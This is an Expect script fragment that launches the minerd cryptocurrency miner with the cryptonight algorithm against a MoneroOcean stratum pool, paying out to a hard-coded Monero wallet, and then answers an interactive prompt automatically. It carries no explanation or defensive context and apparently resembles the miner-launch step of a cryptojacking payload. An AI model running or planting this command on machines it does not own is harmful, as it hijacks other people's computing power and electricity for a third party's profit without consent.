
spawn minerd -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:10004 -u 49RpBH7MkMoWdUMjc7YZAsLkMF2RGzpgYhsZB6zPRyQj8KYBRaCxxk8MBQLekTbaY3Wnn5LXtSZN8cZvhprTuk9qRADHHGg -p x
expect -re "#"
send -- "0\r"
set timeout 60
expect eof
